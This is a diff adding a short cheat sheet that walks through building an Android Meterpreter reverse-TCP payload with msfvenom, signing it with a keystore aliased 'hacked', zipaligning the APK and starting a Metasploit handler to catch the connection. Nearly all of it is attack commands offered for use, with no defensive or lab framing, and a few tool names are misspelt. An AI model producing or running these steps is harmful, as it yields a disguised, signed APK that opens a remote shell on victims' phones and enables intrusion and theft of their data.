@@ -1,0 +1,40 @@
+## creating android payload
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=9546 R> android_shell.apk  
+
+
+## creating .keystore file #password should be alphabet
+
+keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
+
+
+
+## signing apk with jarsigner
+
+sudo apt install openjdj-11-jdk
+
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore android_shell.apk hacked
+
+jarsigner -verify -verbose -certs android_shell.apk
+
+
+
+## Verifying the .apk into a new file using Zipalign
+
+sudo apt install zipalign
+
+zipalign -v 4 android_shell.apk singed_jar.apk
+
+
+
+
+### Now start metasplot
+
+msfconsole
+
+use exploit/multi/handler
+
+run
+
+
+#android/meterpreter/reverse_tcp
